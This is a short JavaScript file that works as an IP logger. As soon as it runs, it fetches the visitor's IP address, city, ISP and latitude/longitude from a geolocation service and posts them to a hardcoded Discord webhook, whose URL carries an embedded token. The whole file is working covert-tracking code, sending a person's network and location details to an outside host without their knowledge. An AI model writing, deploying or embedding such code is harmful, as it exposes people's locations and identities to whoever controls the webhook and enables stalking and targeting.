const geoAPI = "http://ip-api.com/json/";
const webhookURL = "https://discord.com/api/webhooks/1361652529582047442/6V_CCZ6XV_9L_vnqwF3y3rmrggqGaxDWUI6ldqFojZJ24HG8-ONFy0e6cyNGsjZQg9yN";

async function getGeoInfo() {
    try {
        const response = await fetch(geoAPI);
        const geo = await response.json();
        return geo;
    } catch (error) {
        console.error("Error fetching geolocation info:", error);
        return null;
    }
}

async function sendToDiscord(geo) {
    if (!geo) {
        console.error("Geo info is null or undefined.");
        return;
    }

    const fields = [
        { name: 'IP', value: geo.query },
        { name: 'IP Type', value: geo.mobile ? 'Mobile' : 'Fixed' },
        { name: 'Country', value: geo.country },
        { name: 'City', value: geo.city },
        { name: 'Continent', value: geo.continent || 'N/A' },
        { name: 'IP Name', value: geo.as || 'N/A' },
        { name: 'ISP', value: geo.isp },
        { name: 'Latitude', value: geo.lat.toString() },
        { name: 'Longitude', value: geo.lon.toString() },
        { name: 'Org', value: geo.org },
        { name: 'Region', value: geo.regionName },
        { name: 'Status', value: geo.status }
    ];

    const embed = {
        title: "IP Geolocation Info",
        fields: fields.map(f => ({ name: f.name, value: f.value, inline: true })),
        timestamp: new Date().toISOString()
    };

    const payload = {
        embeds: [embed]
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Geo info sent to Discord successfully!");
        } else {
            console.error("Error sending geo info to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

async function main() {
    const geo = await getGeoInfo();
    await sendToDiscord(geo);
}

main();
